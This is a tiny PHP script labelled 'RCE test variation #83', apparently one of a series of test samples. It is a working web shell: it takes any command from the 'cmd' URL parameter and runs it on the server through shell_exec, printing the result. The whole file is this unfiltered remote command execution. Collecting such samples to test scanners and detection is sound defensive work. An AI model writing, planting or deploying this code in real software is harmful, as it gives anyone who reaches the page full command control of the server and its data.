<?php
// RCE test variation #83
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>